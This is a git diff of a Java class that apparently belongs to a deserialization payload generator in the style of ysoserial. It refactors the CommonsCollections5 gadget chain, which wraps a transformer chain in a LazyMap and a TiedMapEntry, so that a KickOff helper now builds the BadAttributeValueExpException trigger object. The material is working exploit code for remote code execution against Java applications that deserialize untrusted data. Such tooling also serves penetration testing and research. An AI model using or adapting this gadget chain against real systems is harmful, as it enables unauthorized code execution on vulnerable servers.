@@ -1,5 +1,6 @@
 package com.ppp.chain.collections3;
 
+import com.ppp.KickOff;
 import com.ppp.ObjectPayload;
 import com.ppp.annotation.Authors;
 import com.ppp.annotation.Dependencies;
@@ -14,7 +15,6 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
-import javax.management.BadAttributeValueExpException;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -47,8 +47,7 @@ public class CommonsCollections5 implements ObjectPayload<Object> {
         final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
         TiedMapEntry entry = new TiedMapEntry(lazyMap, "x");
 
-        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
-        Reflections.setFieldValue(val, "val", entry);
+        Object val = KickOff.badAttributeValueExpException(entry);
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
 
         return val;
